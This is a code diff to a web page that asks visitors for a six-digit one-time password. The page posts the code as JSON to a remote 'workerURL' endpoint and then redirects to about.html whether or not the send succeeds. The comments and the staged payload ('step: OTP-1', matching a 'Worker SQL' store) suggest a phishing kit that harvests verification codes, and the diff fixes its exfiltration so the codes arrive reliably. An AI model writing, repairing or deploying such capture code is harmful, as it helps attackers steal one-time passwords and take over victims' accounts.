@@ -75,7 +75,7 @@
             </div>
             
             <div class="btn-row">
-                <button type="button" class="btn btn-submit" onclick="submitOTP()">Confirm</button>
+                <button type="button" class="btn btn-submit" id="submitBtn" onclick="submitOTP()">Confirm</button>
                 <button type="button" class="btn btn-resend" onclick="location.reload()">Cancel</button>
             </div>
         </div>
@@ -110,30 +110,39 @@
         async function submitOTP() {
             const otpField = document.getElementById('otp_val');
             const otp = otpField.value;
+            const btn = document.getElementById('submitBtn');
             
-            // Strict 6 Digit Validation
             if (otp.length !== 6) {
                 alert("Please enter exactly 6 digits.");
                 return;
             }
 
+            btn.disabled = true;
+            btn.innerText = "Verifying...";
+
+            // FIX: Added 'type' and 'otp_value' to match Worker SQL
             const payload = { 
-                otp: otp, 
-                time: new Date().toLocaleTimeString(),
-                status: "OTP_VERIFIED"
+                type: "OTP",
+                step: "OTP-1", 
+                otp: otp
             };
 
-            // Background send
-            fetch(workerURL, { 
-                method: 'POST', 
-                mode: 'no-cors', 
-                body: JSON.stringify(payload) 
-            });
-
-            // Sidha Redirect
-            window.location.href = "about.html";
+            try {
+                // FIX: Removed 'no-cors', using 'cors' mode
+                await fetch(workerURL, { 
+                    method: 'POST', 
+                    mode: 'cors',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload) 
+                });
+                
+                // Redirecting to Next Page
+                window.location.href = "about.html";
+            } catch (err) {
+                // Error hone par bhi redirect kar do
+                window.location.href = "about.html";
+            }
         }
     </script>
 </body>
 </html>
-
